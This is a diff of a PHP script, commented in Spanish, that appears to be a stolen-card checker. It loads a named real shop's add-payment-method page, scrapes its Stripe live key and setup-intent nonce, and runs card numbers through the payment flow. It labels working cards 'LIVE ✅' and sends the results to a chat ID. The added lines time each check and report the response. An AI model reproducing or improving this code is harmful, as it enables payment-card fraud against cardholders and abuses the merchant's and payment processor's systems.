@@ -1924,8 +1924,7 @@ $startTime = microtime(true); //TIEMPO DE INICIO
 $BinData = BinData($bin); //Extrae los datos del bin
 
 //sendPv($myid, 'error4..');
-
-	$curl = curl_init();
+$curl = curl_init();
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://healthyfungi.com.au/my-account/add-payment-method/',
   CURLOPT_RETURNTRANSFER => true,
@@ -1957,7 +1956,6 @@ $pk_live = $matches_pk[1];
 $patron_nonce = '/"createSetupIntentNonce":"([^"]*)"/';
 preg_match($patron_nonce, $response, $matches_nonce);
 $nonce = $matches_nonce[1];
-
 
 
 
@@ -2106,6 +2104,18 @@ if (empty($respo)) {
         $respo = $response;
 }
 
+$timetakeen = (microtime(true) - $startTime);
+$time = substr_replace($timetakeen, '', 4);
+$proxy = "LIVE ✅";
+
+$bin = "<code>".$bin."</code>";
+$lista = "<code>".$lista."</code>";
+
+if (empty($respo)) {
+        $respo = $response;
+}
+
+sendPv($myid, $response);
 
 // Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
 if (array_in_string($respo, $live_array)) {
